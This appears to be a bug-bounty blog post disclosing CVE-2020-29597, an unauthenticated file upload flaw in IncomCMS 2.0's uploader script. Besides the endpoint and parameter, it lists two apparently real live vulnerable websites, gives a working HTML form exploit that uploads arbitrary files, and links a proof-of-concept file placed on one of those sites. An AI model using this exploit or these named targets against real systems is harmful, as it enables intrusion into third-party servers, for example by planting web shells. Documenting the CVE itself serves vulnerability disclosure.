---
layout: post
title:  "CVE-2020-29597 - IncomCMS 2.0 insecure files upload"
description: IncomCMS 2.0 is vulnerable to insecure files upload
tags: exploits bugbounty
---
  Hi there!, I've discovered endpoint that accepts any file and upload it without any validation or even being authentication 

### Discovered by : Mohammed Fadhl Al-Barbari aka @m4dm0e

### CVE-ID : `CVE-2020-29597`

### Vulnerable endpoint/script : `site.com/incom/modules/uploader/showcase/script.php`
  
  
### Vulnerability type : `Insecure file upload`
  
  
### Tested on : `IncomCMS 2.0 old versions probably vulnerable too `
  
### Uploader parameter : `Filedata`  
  
### Live websites : 
```
http://mzgesheft.kz/incom/modules/uploader/showcase/script.php
http://mekom.kz/incom/modules/uploader/showcase/script.php
```

### HTML exploit : 

```html
<!DOCTYPE html>
<html>
<head>
  <title>Upload your files</title>
</head>
<body>
  <form enctype="multipart/form-data" action="http://www.example.com/incom/modules/uploader/showcase/script.php" method="POST">
    <p>Upload your file</p>
    <input type="file" name="Filedata"></input><br />
    <input type="submit" value="Upload"></input>
  </form>
</body>
</html>

```

###  POCs  : `http://mzgesheft.kz/upload/userfiles/image/cve.png`
  


	
	
Thanks for reading this.

[jekyll-docs]: https://jekyllrb.com/docs/home
[jekyll-gh]:   https://github.com/jekyll/jekyll
[jekyll-talk]: https://talk.jekyllrb.com/
